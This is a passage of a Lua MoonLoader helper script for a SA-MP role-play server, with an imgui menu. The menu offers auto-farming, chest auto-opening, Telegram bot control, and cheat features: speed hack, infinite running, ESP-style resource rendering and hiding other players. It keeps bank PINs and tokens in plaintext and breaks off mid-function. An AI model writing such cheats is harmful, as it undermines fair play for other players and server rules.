--[[ТУТ НЕЧЕГО СМОТРЕТЬ]]
if thisScript().filename == "MiniCrHelper.lua" then script_name('ЗАЛУПА HELPER.lua') end if thisScript().filename == "MiniCrHelper.luac" then script_name('ЗАЛУПА HELPER.luac') end
    

script_version("0.3.4")
script_url('TG @IIzIIIzIVzVII')
    
script_properties("work-in-pause")
require 'lib.moonloader'
imgui = require 'mimgui'
encoding = require 'encoding'
ffi = require 'ffi'
sampev = require 'samp.events'
Memory = require 'memory'
inicfg = require 'inicfg'
ti = require 'tabler_icons'
dlstatus = require('moonloader').download_status
    

encoding.default = 'CP1251'
u8 = encoding.UTF8
    

new, str = imgui.new, ffi.string
font = renderCreateFont("Arial", 10, 14)
    

effil_check, effil = pcall(require, 'effil')
monet_check, monet = pcall(require, 'MoonMonet')

function table.assign(target, def, deep)
    for k, v in pairs(def) do
        if target[k] == nil then
            if type(v) == 'table' then
                target[k] = {}
                table.assign(target[k], v)
            else  
                target[k] = v
            end
        elseif deep and type(v) == 'table' and type(target[k]) == 'table' then 
            table.assign(target[k], v, deep)
        end
    end 
    return target
end
    
function json(path)
    createDirectory(getWorkingDirectory() .. '/config')
    local path = getWorkingDirectory() .. '/config/' .. path
    local class = {}
function class:save(array)
    if array and type(array) == 'table' and encodeJson(array) then
        local file = io.open(path, 'w')
        file:write(encodeJson(array))
        file:close()
    else
        sms('Ошибка при сохранение файла!')
    end
end
    
function class:load(array)
    local result = {}
    local file = io.open(path)
    if file then
        result = decodeJson(file:read()) or {}
    end
        return table.assign(result, array, true)
    end
    return class
end

local mainIni = inicfg.load({
    main = {
        chat_id = '',
        token = '',
        namelavkas = '',
        kodbank = '',
        kodsklad = '',
        nickrecons = '',
        serverrecon = '',
        loginq = '',
        passq = '',
        cmd1 = 'cr',
        cmd2 = 'rec',
        cmd3 = 'smsf',
        cmd4 = 'aq',
        cmd5 = 'call',
        cmd6 = 'bug',
        
        autoeat = false,
        autoclean = false,
        diolog = false,
        cmd = false,
        info = false,
        standart = false,
        platina = false,
        mask = false,
        donate = false,
        tainik = false,
        vice = false,
        clean = false,
        settingslavka = false,
        running = false,
        show = false,
        speedrunning = false,
        infonline = false,
        infrender = false,
        infradius = false,
        infclean = false,
        infautoclean = false,
        infautolavka = false,
        checkboxkodbank = false,
        checkboxkodsklad = false,
        timekalashnikov = true,
        mysave = false,
        autorec = false,
        
        powfish = 70,
        stroki = 5,
        renderlavokx = 500,
        renderlavoky = 500,
        chestposx = 500,
        chestposy = 500,
        delayedtimerposx = 500,
        delayedtimerposy = 500,
        autoeatmin = 25,
        ComboTest = 0,
        smspush = 1,
    }
}, "MiniCrHelper/MiniHelper-CR.ini")
    
local jsonLog = json('Log.json'):load({})
local jsonConfig = json("MiniCrHelper/MiniCrHelper.json"):load({
    ['script'] = {
        scriptColor = {1.0, 1.0, 1.0},
        scriptColortext = {text = {1.0, 1.0, 1.0}, window = {0.2, 0.2, 0.2}},
        lastNewsCheck = 0
    },
    ['notifications'] = {
        inputToken = '',
        inputGroup = '',
        resale = false,
        action = false,
        balance = false,
        statistics = false,
        death = false,
        moreItems = false,
        message = false,
        damage = false,
        catchingShop = false,
        status32 = false,
        status33 = false,
        status34 = false,
        status35 = false,
        status37 = false
    },
    ['market'] = {
        fontSize = 1.0,
        fontAlpha = 1.00,
        marketAlpha = 1.00,
        marketSize = {x = 700, y = 260},
        marketBool = false,
        marketColor = {text = {1.0, 1.0, 1.0}, window = {0.2, 0.2, 0.2}},
        marketPos = {x = -1, y = -1}
    },
    ['informer'] = {
        fontSizea = 1.0,
        fontAlphaa = 1.00,
        marketAlphaa = 1.00,
        marketSizea = {x = 700, y = 260},
        marketColora = {text = {1.0, 1.0, 1.0}, window = {0.0, 0.0, 0.0}},
        marketPosa = {x = -1, y = -1}
    }
})
    

window = imgui.new.bool(false)
showdebug = imgui.new.bool(false)
idkeys = imgui.new.bool(false)
WinStateTG = new.bool(false)
afktools = new.bool(false)
tab = 0 


lavka = new.bool() 
radiuslavki = new.bool()
settingslavka = new.bool(mainIni.main.settingslavka) 
clean = new.bool(mainIni.main.clean) 
autoclean = new.bool(mainIni.main.autoclean) 
autoeat = new.bool(mainIni.main.autoeat)
pcoff = new.bool()
checkbox_standart = new.bool(mainIni.main.standart)
checkbox_donate = new.bool(mainIni.main.donate)
checkbox_tainik = new.bool(mainIni.main.tainik)
checkbox_mask = new.bool(mainIni.main.mask)
checkbox_platina = new.bool(mainIni.main.platina)
checkbox_vice = new.bool(mainIni.main.vice)
Chest = new.bool()
workbotton = new.bool()
delayedtimer = new.bool()
running = new.bool(mainIni.main.running)
speedrunning = new.bool(mainIni.main.speedrunning)
lenwh = new.bool()
xlopokwh = new.bool()
shaxta = new.bool()
autoalt = new.bool()
checkboxkodbank = new.bool(mainIni.main.checkboxkodbank) 
checkboxkodsklad = new.bool(mainIni.main.checkboxkodsklad) 
cmd = new.bool(mainIni.main.cmd)
diolog = new.bool(mainIni.main.diolog) 
infonline = new.bool(mainIni.main.infonline)
infrender = new.bool(mainIni.main.infrender)
infradius = new.bool(mainIni.main.infradius)
infclean = new.bool(mainIni.main.infclean)
infautoclean = new.bool(mainIni.main.infautoclean)
infautolavka = new.bool(mainIni.main.infautolavka)
timekalashnikov = new.bool(mainIni.main.timekalashnikov)
show = imgui.new.bool(mainIni.main.show)
mysave = new.bool(mainIni.main.mysave) 
debugwh3d = new.bool()
debugwh = new.bool()
textdrawid = new.bool()
autorec = new.bool(mainIni.main.autorec)


namelavkas = new.char[256](u8(mainIni.main.namelavkas))
kodbank = new.char[256](u8(mainIni.main.kodbank))
kodsklad = new.char[256](u8(mainIni.main.kodsklad))
chat_id = new.char[256](u8(mainIni.main.chat_id)) 
token = new.char[256](u8(mainIni.main.token))
loginq = new.char[256](u8(mainIni.main.loginq))
passq = new.char[256](u8(mainIni.main.passq))
chatinputField = new.char[256]()

cmd1 = new.char[256](u8(mainIni.main.cmd1))
cmd2 = new.char[256](u8(mainIni.main.cmd2))
cmd3 = new.char[256](u8(mainIni.main.cmd3))
cmd4 = new.char[256](u8(mainIni.main.cmd4))
cmd5 = new.char[256](u8(mainIni.main.cmd5))
cmd6 = new.char[256](u8(mainIni.main.cmd6))


SliderOne = new.int(mainIni.main.autoeatmin)
ComboTest = new.int((mainIni.main.ComboTest)) 
Sliderdebugwh3d = new.int(10)
SliderTwo = new.int(0)
SliderFri = new.int(0)
smspush = imgui.new.int(mainIni.main.smspush)
timechestto = new.int(10) 
powfish = new.int(mainIni.main.powfish)
stroki = new.int(mainIni.main.stroki)


item_list = {u8'Чипсы', u8'Оленина', u8'Мешок с мясом'}
ImItems = imgui.new['const char*'][#item_list](item_list)
textdraw = { [1] = {_, _, 1000}, [2] = {_, _, 1000}, [3] = {_, _, 1000}, [4] = {_, _, 1000}, [5] = {_, _, 1000}, [6] = {_, _, 1000}, } 
secretkey = false
loginkey = '123'
passkey = '123' 
sw, sh = getScreenResolution() 
button_names = {u8"Chat", u8"Push"} 
onShowDialogwqq = ''
fpsID = ''
ping = ''
idshow = '' 
diamondti = ti 'diamond'
packageti = ti 'package'
storeti = ti 'building-store'
codeti = ti 'code'
infoti = ti 'info-circle'
telegramti = ti 'brand-telegram'
infoscriptti = ti 'prompt'
refreshti = ti 'refresh-alert'
submarineti = ti 'submarine'
sendtiq = ti 'brand-telegram'
bugti = ti 'bug'
sessionStart = os.time()
sessiononline = 0
messageLog = {} 
piska = 0 
counter = 0
speedhackf = new.float(1.1)
nickrecons = ''
serverrecon = ''
satiety = nil


fontSize = imgui.new.float(jsonConfig['market'].fontSize)
fontAlpha = imgui.new.float(jsonConfig['market'].fontAlpha)
marketAlpha = imgui.new.float(jsonConfig['market'].marketAlpha)
marketSize = {x = imgui.new.int(jsonConfig['market'].marketSize.x), y = imgui.new.int(jsonConfig['market'].marketSize.y)}
marketBool = {now = imgui.new.bool(), always = imgui.new.bool(jsonConfig['market'].marketBool)}
marketColor = {text = imgui.new.float[3](jsonConfig['market'].marketColor.text), window = imgui.new.float[3](jsonConfig['market'].marketColor.window)}
marketPos = imgui.ImVec2(jsonConfig['market'].marketPos.x, jsonConfig['market'].marketPos.y)
marketShop = {}
scriptColor = imgui.new.float[3](jsonConfig['script'].scriptColor)
scriptColortext = {text = imgui.new.float[3](jsonConfig['script'].scriptColortext.text), window = imgui.new.float[3](jsonConfig['script'].scriptColortext.window)}


fontSizea = imgui.new.float(jsonConfig['informer'].fontSizea)
fontAlphaa = imgui.new.float(jsonConfig['informer'].fontAlphaa)
marketAlphaa = imgui.new.float(jsonConfig['informer'].marketAlphaa)
marketColora = {text = imgui.new.float[3](jsonConfig['informer'].marketColora.text), window = imgui.new.float[3](jsonConfig['informer'].marketColora.window)}
marketSizea = {x = imgui.new.int(jsonConfig['informer'].marketSizea.x), y = imgui.new.int(jsonConfig['informer'].marketSizea.y)}
marketPosa = imgui.ImVec2(jsonConfig['informer'].marketPosa.x, jsonConfig['informer'].marketPosa.y)

 
imgui.OnFrame(function() return window[0] end, function(player)
    imgui.SetNextWindowPos(imgui.ImVec2(sw/2.5,sh/2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5,0.5))
    imgui.SetNextWindowSize(imgui.ImVec2(370, 320), imgui.Cond.Always)
    imgui.PushStyleColor(imgui.Col.Text, imgui.ImVec4(scriptColortext.text[0], scriptColortext.text[1], scriptColortext.text[2], fontAlpha[0]))
    imgui.Begin(u8'Залупа Helper | v'..thisScript().version, window, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse + imgui.WindowFlags.AlwaysAutoResize)
    imgui.SetCursorPosY(1)
    if imgui.Button('DEBUG') then
        showdebug[0] = true
        window[0] = false
    end
    if u8:decode(str(loginq)) == loginkey and u8:decode(str(passq)) == passkey and secretkey == true then
        local tabs = {
            { title = diamondti, id = 1 },
            { title = packageti, id = 2 },
            { title = storeti, id = 3 },
            { title = codeti, id = 4 },
            { title = infoti, id = 5 },
            { title = telegramti, id = 6 },
            { title = infoscriptti, id = 7 }
        }    
        for i, tabInfo in ipairs(tabs) do
            if imgui.Button(tabInfo.title .. '##000' .. i, imgui.ImVec2(80, 31.8)) then
                tab = tabInfo.id
            end
        end
        if imgui.Button(refreshti .. '##0001', imgui.ImVec2(80, 31.8)) then  
            sms('{FF0000}Скрипт перезагружается')
            thisScript():reload()
        end
    end
    
    if tab == 0 then
    imgui.Image(imhandle1, imgui.ImVec2(370, 285))
    imgui.SetCursorPosY(40)
    imgui.CenterText(u8'Авторизация')
    imgui.SetCursorPosY(70)
    imgui.PushItemWidth(150)
    imgui.InputTextWithHint(u8'##1login', u8'login', loginq, 256, imgui.SetCursorPosX((imgui.GetWindowWidth() - 150) / 2))
    imgui.SetCursorPosY(100)
    imgui.InputTextWithHint(u8'##1password', u8'password', passq, 256, imgui.SetCursorPosX((imgui.GetWindowWidth() - 150) / 2))
    imgui.PopItemWidth()
    imgui.SetCursorPosY(265)
    imgui.Text(u8'Автор', imgui.SetCursorPosX((imgui.GetWindowWidth() - 35) / 2))
    imgui.PopItemWidth()
    imgui.SetCursorPosY(280)
    imgui.LinkText('https://t.me/IIzIIIzIVzVII', imgui.SetCursorPosX((imgui.GetWindowWidth() - 130) / 2))
    imgui.SetCursorPosY(300)
    imgui.LinkText('https://www.blast.hk/members/464512/', imgui.SetCursorPosX((imgui.GetWindowWidth() - 220) / 2))
    imgui.PopItemWidth()
    imgui.SetCursorPosY(130)
    if imgui.Checkbox(u8'Запомнить меня', mysave, imgui.SetCursorPosX((imgui.GetWindowWidth() - 150) / 2)) then
        mainIni.main.mysave = mysave[0] 
        inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
        if mysave[0] == true then
            mainIni.main.passq = u8:decode(str(passq))
            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
        end
        if mysave[0] == true then
            mainIni.main.loginq = u8:decode(str(loginq))
            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
        end
        if mysave[0] == false then
            mainIni.main.loginq = ''
            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
        end
        if mysave[0] == false then
                mainIni.main.passq = ''
                inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
            end
        end
        imgui.SetCursorPosY(160)
        if imgui.Button(u8'Войти', imgui.ImVec2(100, 35), imgui.SetCursorPosX((imgui.GetWindowWidth() - 100) / 2)) then
            if u8:decode(str(loginq)) == loginkey and u8:decode(str(passq)) == passkey then
                if smspush[0] == 1 then
                    sms('Успешный вход')
            elseif smspush[0] == 2 and toast_ok then  
                toast.Show(u8'Успешный вход', toast.TYPE.OK, 2)
                end
                secretkey = true
                tab = 1    
                else
                if smspush[0] == 1 then
                    sms('{FF0000}Неверный логин или пароль') 
            elseif smspush[0] == 2 and toast_ok then  
                    toast.Show(u8'Неверный логин или пароль',  toast.TYPE.ERROR, 2)
                end
            end    
        end
        elseif tab == 1 then
        imgui.SetCursorPos(imgui.ImVec2(95, 28)) 
        if imgui.BeginChild('Name##'..tab, imgui.ImVec2(268 , 285), true) then
            imgui.Checkbox(u8'Рендер лавок', lavka)
		    imgui.SameLine()
            imgui.TextQuestion(u8("Right Shift + 1"))
            imgui.SameLine()
            imgui.SetCursorPosX(195)
            if imgui.Button(u8'Позиция##1') then 
                if smspush[0] == 1 then
                    sms('Нажмите {mc}ПРОБЕЛ{-1}, чтобы сохранить позицию.')
            elseif smspush[0] == 2 and toast_ok then  
                toast.Show(u8'Нажмите ПРОБЕЛ, чтобы сохранить позицию.', toast.TYPE.INFO, 2)
                end
                renderlavok = true
            end
            imgui.Checkbox(u8'Радиус между лавками', radiuslavki)
            imgui.SameLine()
            imgui.TextQuestion(u8("Right Shift + 2"))
		    imgui.Checkbox(u8'Удаление Игроков и ТС', clean)
            imgui.SameLine()
            imgui.TextQuestion(u8("Right Shift + 3"))
            if imgui.Checkbox(u8'Авто-Удаление', autoclean) then
                mainIni.main.autoclean = autoclean[0] 
		        inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
            end
            imgui.SameLine()
            imgui.TextQuestion(u8("Автоматически удаляет \nигроков и авто в лавке"))
            if imgui.Checkbox(u8'Авто-Лавка', settingslavka) then
                mainIni.main.settingslavka = settingslavka[0] 
		        inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
            end
            imgui.SameLine()
            imgui.TextQuestion(u8("Авто название лавки"))
            if imgui.InputText(u8"name-lavka", namelavkas, 256) then 
                mainIni.main.namelavkas = u8:decode(str(namelavkas))
                inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
            end
		    imgui.Separator()	
		    imgui.PushItemWidth(190)
		    if imgui.SliderInt(u8'Голод', SliderOne, 20, 100) then
		        mainIni.main.autoeatmin = SliderOne[0]
		        inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
		    end
		    imgui.PopItemWidth()
		    if imgui.Combo(u8'##',ComboTest,ImItems, #item_list) then
		        mainIni.main.ComboTest = ComboTest[0]
		        inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
		    end
            if imgui.Checkbox(u8'Авто-Еда', autoeat) then
		        mainIni.main.autoeat = autoeat[0] 
		        inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
	        end
            imgui.Image(imhandle, imgui.ImVec2(250, 300))	
        end
		elseif tab == 2 then
            imgui.SetCursorPos(imgui.ImVec2(95, 28))
            if imgui.BeginChild('Name##'..tab, imgui.ImVec2(268 , 285), true) then 
		        if imgui.Checkbox(u8'Сундук рулетки', checkbox_standart) then
		            mainIni.main.standart = checkbox_standart[0] 
		            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
                end
		        if imgui.Checkbox(u8'Сундук платиновой рулетки', checkbox_platina) then
	                mainIni.main.platina = checkbox_platina[0] 
		            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
	            end
		        if imgui.Checkbox(u8'Сундук рулетки (донат)', checkbox_donate) then
		            mainIni.main.donate = checkbox_donate[0] 
		            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
	            end
		        if imgui.Checkbox(u8'Тайник Илона Маска', checkbox_mask) then
                    mainIni.main.mask = checkbox_mask[0] 
	                inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
                end	
		        if imgui.Checkbox(u8'Тайник Лос Сантоса', checkbox_tainik) then
	                mainIni.main.tainik = checkbox_tainik[0] 
	                inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
	            end 	
		        if imgui.Checkbox(u8'Тайник Vice City', checkbox_vice) then
	                mainIni.main.vice = checkbox_vice[0] 
	                inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
                end 
                if imgui.Checkbox(u8'Запустить Сундуки###777', workbotton) then
                    work = true
                    chestonoff = true
                end
                if workbotton[0] == false then
                chestonoff = false
                work = false
                startTime = os.time() 
                delayedtimeraaaa = false    
            end
            delayedtimeraaaa = false 
            imgui.SameLine()
            imgui.TextQuestion(u8("Right Shift + 4"))
            imgui.SameLine()
            imgui.SetCursorPosX(195)
            if imgui.Button(u8'Позиция##2') then
                if smspush[0] == 1 then
                    sms('Нажмите {mc}ПРОБЕЛ{-1}, чтобы сохранить позицию.')
            elseif smspush[0] == 2 and toast_ok then  
                    toast.Show(u8'Нажмите ПРОБЕЛ, чтобы сохранить позицию.', toast.TYPE.INFO, 2)
                end
                chestpos = true
            end
            imgui.Separator()
            imgui.PushItemWidth(220)
            imgui.SliderInt(u8'мин##15689', timechestto, 1, 150)
            imgui.PopItemWidth()
            if imgui.Checkbox(u8'Отложенный Запуск', delayedtimer) then
                delayedtimeraaaa = true
            end
            if delayedtimer[0] == false then
                delaychect = os.time()
                delayedtimeraaaa = false
            end
            imgui.SameLine()
            imgui.SetCursorPosX(195)
            if imgui.Button(u8'Позиция##3') then
                if smspush[0] == 1 then
                    sms('Нажмите {mc}ПРОБЕЛ{-1}, чтобы сохранить позицию.')
            elseif smspush[0] == 2 and toast_ok then  
                    toast.Show(u8'Нажмите ПРОБЕЛ, чтобы сохранить позицию.', toast.TYPE.INFO, 2)
                end
                delayedtimerpos = true
            end
            if imgui.Button(u8'Inventory', imgui.ImVec2(250, 8)) then
                sampSendChat('/invent')   
            end
        end
    elseif tab == 3 then 
            imgui.SetCursorPos(imgui.ImVec2(95, 28)) 
            if imgui.BeginChild('Name##'..tab, imgui.ImVec2(268 , 285), true) then
                if imgui.ActiveButton(u8(marketBool.now[0] and 'Включено' or 'Выключено'), imgui.ImVec2(170)) then marketBool.now[0] = not marketBool.now[0] end
                    imgui.SameLine()
                    imgui.Text(u8('Статус окна'))
                    if imgui.Button(u8('Тестовые строчки'), imgui.ImVec2(120)) then
                        marketShop = {}
                        for i = 1, stroki[0] do marketShop[i] = 'Вы купили Семейный талон (1 шт.) у игрока Test за $123.123.123.123' end
                    end
                    imgui.SameLine()
                        if imgui.Button(u8('Очистить строчки'), imgui.ImVec2(120)) then
                            marketShop = {}
                        end
                        if imgui.DragFloat(u8('Размер шрифта'), fontSize, 0.01, 0.1, 2.0, "%.1f") then
                            jsonConfig['market'].fontSize = fontSize[0]
                            json("MiniCrHelper/MiniCrHelper.json"):save(jsonConfig)
                         end
                        if imgui.DragFloat(u8('Прозрачность окна'), marketAlpha, 0.01, 0.0, 1.0, "%.2f") then
                            jsonConfig['market'].marketAlpha = marketAlpha[0]
                            json("MiniCrHelper/MiniCrHelper.json"):save(jsonConfig)
                        end
                        if imgui.SliderInt(u8'Кол-во строк', stroki, 5, 30) then
                            mainIni.main.stroki = stroki[0]
		                    inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
                        end
                        if imgui.ColorEdit3(u8('Цвет текста'), marketColor.text) then
                            jsonConfig['market'].marketColor.text = {marketColor.text[0], marketColor.text[1], marketColor.text[2]}
                            json("MiniCrHelper/MiniCrHelper.json"):save(jsonConfig)
                        end
                            if imgui.ColorEdit3(u8('Цвет окна'), marketColor.window) then
                                jsonConfig['market'].marketColor.window = {marketColor.window[0], marketColor.window[1], marketColor.window[2]}
                                json("MiniCrHelper/MiniCrHelper.json"):save(jsonConfig)
                            end
                            if imgui.ActiveButton(u8('Позиция'), imgui.ImVec2(85 - 2.5)) then
                                if smspush[0] == 1 then
                                    sms('Нажмите {mc}ПРОБЕЛ{-1}, чтобы сохранить позицию.')
                            elseif smspush[0] == 2 and toast_ok then  
                                    toast.Show(u8'Нажмите ПРОБЕЛ, чтобы сохранить позицию.', toast.TYPE.INFO, 2)
                                end
                                window[0], marketBool.now[0] = false, true
                                sampSetCursorMode(4)
                                lua_thread.create(function()
                                while true do
                                marketPos = imgui.ImVec2(select(1, getCursorPos()), select(2, getCursorPos()))
                                jsonConfig['market'].marketPos = {x = marketPos.x, y = marketPos.y}
                                json("MiniCrHelper/MiniCrHelper.json"):save(jsonConfig)
                                if isKeyDown(32) then
                                    if smspush[0] == 1 then
                                        sms('Местоположение сохранено.')
                                elseif smspush[0] == 2 and toast_ok then  
                                        toast.Show(u8'Местоположение сохранено.', toast.TYPE.INFO, 2)
                                    end
                                    window[0], marketBool.now[0] = true, true
                                    sampSetCursorMode(0)
                                break
                            end
                        wait(0)
                    end
                end)
            end
            imgui.SameLine()
            imgui.Text(u8('Местоположение окна'))
            imgui.Separator()
            if imgui.ColorEdit3(u8('##Цвет скрипта'), scriptColor, imgui.ColorEditFlags.NoInputs) then 
                getTheme() 
            end
            imgui.SameLine()
            imgui.Text(u8('Цвет скрипта'))
            imgui.SameLine()
            if imgui.ColorEdit3(u8('##Цвет текста'), scriptColortext.text, imgui.ColorEditFlags.NoInputs) then
                jsonConfig['script'].scriptColortext.text = {scriptColortext.text[0], scriptColortext.text[1], scriptColortext.text[2]}
                json("MiniCrHelper/MiniCrHelper.json"):save(jsonConfig)
            end
            imgui.SameLine()
            imgui.Text(u8('Цвет текста'))
        end
    elseif tab == 4 then
        imgui.SetCursorPos(imgui.ImVec2(95, 28))
        if imgui.BeginChild('Name##'..tab, imgui.ImVec2(268 , 285), true) then
            imgui.Checkbox(u8'Рендер на лён', lenwh)
            imgui.Checkbox(u8'Рендер на хлопак', xlopokwh)
            imgui.Checkbox(u8'Рендер на шахту', shaxta)
            imgui.Checkbox(u8'Авто Alt', autoalt)
            imgui.SameLine()
            imgui.TextQuestion(u8("Ферма | Шахта"))
            imgui.Separator()	
            if imgui.SliderInt(u8'pov', powfish, 70, 110) then 
                mainIni.main.powfish = powfish[0]
                inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
            end
            imgui.SameLine()
            if imgui.Button(u8'Сброс') then
                cameraSetLerpFov(70.0, 70.0, 1000, 1)
                powfish[0] = 70
                mainIni.main.powfish = powfish[0]
                inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
            end  
            imgui.Separator()	
            if imgui.Checkbox(u8'Бесконечный бег', running) then
                mainIni.main.running = running[0] 
                inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
            end
            if imgui.Checkbox(u8'Быстрый бег и езда', speedrunning) then
                mainIni.main.speedrunning = speedrunning[0] 
                inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
            end
            imgui.SameLine()
            imgui.TextQuestion(u8("Пешком - Space | Авто Shift"))
            imgui.Separator()
            imgui.PushItemWidth(80)
            if imgui.Checkbox(u8'Вкл/Выкл###checkboxkodbank', checkboxkodbank) then
                mainIni.main.checkboxkodbank = checkboxkodbank[0] 
                inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
            end
            imgui.SameLine()
            if imgui.InputText(u8"Пароль Банк", kodbank, 256, imgui.InputTextFlags.CharsDecimal) then
                mainIni.main.kodbank = u8:decode(str(kodbank))
                inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
            end
            if imgui.Checkbox(u8'Вкл/Выкл###checkboxkodsklad', checkboxkodsklad) then
                mainIni.main.checkboxkodsklad = checkboxkodsklad[0] 
                inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
            end
            imgui.SameLine()
            if imgui.InputText(u8"Пароль Склад", kodsklad, 256, imgui.InputTextFlags.CharsDecimal) then
                mainIni.main.kodsklad = u8:decode(str(kodsklad))
                inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
            end
            imgui.PopItemWidth()
            end 
        elseif tab == 5 then  
                imgui.SetCursorPos(imgui.ImVec2(95, 28)) 
                if imgui.BeginChild('Name##'..tab, imgui.ImVec2(268 , 285), true) then 
                    if imgui.Checkbox(u8'Вкл/выкл', show) then
                        mainIni.main.show = show[0] 
                        inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
                    end
                    imgui.SameLine()
                    imgui.SetCursorPosX(135)
                        if imgui.Checkbox(u8'Онлайн##1', infonline) then
                            mainIni.main.infonline = infonline[0] 
                            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
                        end
                        if imgui.Checkbox(u8'Рендер лавок##1', infrender) then
                            mainIni.main.infrender = infrender[0] 
                            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
                        end
                        imgui.SameLine()
                        imgui.SetCursorPosX(135)
                        if imgui.Checkbox(u8'Радиус лавок##1', infradius) then
                            mainIni.main.infradius = infradius[0] 
                            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
                        end
                        if imgui.Checkbox(u8'Удале Игроков##1', infclean) then
                            mainIni.main.infclean = infclean[0] 
                            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
                        end
                        imgui.SameLine()
                        imgui.SetCursorPosX(135)
                        if imgui.Checkbox(u8'Авто-Удаление##1', infautoclean) then
                            mainIni.main.infautoclean = infautoclean[0] 
                            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
                        end
                        if imgui.Checkbox(u8'Авто-Лавка##1', infautolavka) then
                            mainIni.main.infautolavka = infautolavka[0] 
                            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
                        end
                        imgui.SameLine()
                        imgui.SetCursorPosX(135)
                        if imgui.Checkbox(u8'Time-kalash##1', timekalashnikov) then
                            mainIni.main.timekalashnikov = timekalashnikov[0] 
                            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")     
                        end
                        imgui.Separator()
                        if imgui.DragFloat(u8('Размер шрифта'), fontSizea, 0.01, 0.1, 2.0, "%.1f") then
                            jsonConfig['informer'].fontSizea = fontSizea[0]
                            json("MiniCrHelper/MiniCrHelper.json"):save(jsonConfig)
                        end
                        if imgui.DragFloat(u8('Прозрачность окна'), marketAlphaa, 0.01, 0.0, 1.0, "%.2f") then
                            jsonConfig['informer'].marketAlphaa = marketAlphaa[0]
                            json("MiniCrHelper/MiniCrHelper.json"):save(jsonConfig)
                        end
                        if imgui.ColorEdit3(u8('##Цвет текста'), marketColora.text, imgui.ColorEditFlags.NoInputs) then
                            jsonConfig['informer'].marketColora.text = {marketColora.text[0], marketColora.text[1], marketColora.text[2]}
                            json("MiniCrHelper/MiniCrHelper.json"):save(jsonConfig)
                        end
                        imgui.SameLine()
                        imgui.Text(u8('Цвет текста'))
                        imgui.SameLine()
                        if imgui.ColorEdit3(u8('##Цвет окна'), marketColora.window, imgui.ColorEditFlags.NoInputs) then
                            jsonConfig['informer'].marketColora.window = {marketColora.window[0], marketColora.window[1], marketColora.window[2]}
                            json("MiniCrHelper/MiniCrHelper.json"):save(jsonConfig)
                        end
                        imgui.SameLine()
                        imgui.Text(u8('Цвет окна'))
                        if imgui.ActiveButton(u8('Позиция'), imgui.ImVec2(85 - 2.5, 20)) then
                            if smspush[0] == 1 then
                                sms('Нажмите {mc}ПРОБЕЛ{-1}, чтобы сохранить позицию.')
                        elseif smspush[0] == 2 and toast_ok then  
                                toast.Show(u8'Нажмите ПРОБЕЛ, чтобы сохранить позицию.', toast.TYPE.INFO, 2)
                            end
                            window[0], show[0] = false, true
                            sampSetCursorMode(4)
                            lua_thread.create(function()
                            while true do
                            marketPosa = imgui.ImVec2(select(1, getCursorPos()), select(2, getCursorPos()))
                            jsonConfig['informer'].marketPosa = {x = marketPosa.x, y = marketPosa.y}
                            json("MiniCrHelper/MiniCrHelper.json"):save(jsonConfig)
                            if isKeyDown(32) then
                                if smspush[0] == 1 then
                                    sms('Местоположение сохранено.')
                                elseif smspush[0] == 2 and toast_ok then  
                                    toast.Show(u8'Местоположение сохранено.', toast.TYPE.INFO, 2)
                                end
                                window[0], show[0] = true, true
                                sampSetCursorMode(0)
                                break
                            end
                            wait(0)
                        end
                    end)
                end
                imgui.SameLine()
                imgui.Text(u8('Местоположение окна'))
                imgui.Separator()
                imgui.Text(u8('Уведомление'))
                imgui.SameLine()
                for i = 1, 2 do
                    if imgui.RadioButtonIntPtr(button_names[i], smspush, i) then
                        smspush[0] = i
                        mainIni.main.smspush = smspush[0] 
                        inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
                    end
                    if i == 1 then        
                        imgui.SameLine()
                    end
                end
            end
	    elseif tab == 6 then
            imgui.SetCursorPos(imgui.ImVec2(95, 28)) 
            if imgui.BeginChild('Name##'..tab, imgui.ImVec2(268 , 285), true) then 
                if imgui.Checkbox(u8'Принимать команды из TG', cmd) then
		            mainIni.main.cmd = cmd[0] 
		            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
	            end
                if imgui.Checkbox(u8'Отправлять диалоги в TG', diolog) then
		            mainIni.main.diolog = diolog[0] 
		            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
	            end	
                if imgui.InputText(u8"TG ID", chat_id, 256) then 
	                mainIni.main.chat_id = u8:decode(str(chat_id))
		            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
	            end
	            if imgui.InputText(u8"TG TOKEN", token, 256) then
	                mainIni.main.token = u8:decode(str(token))
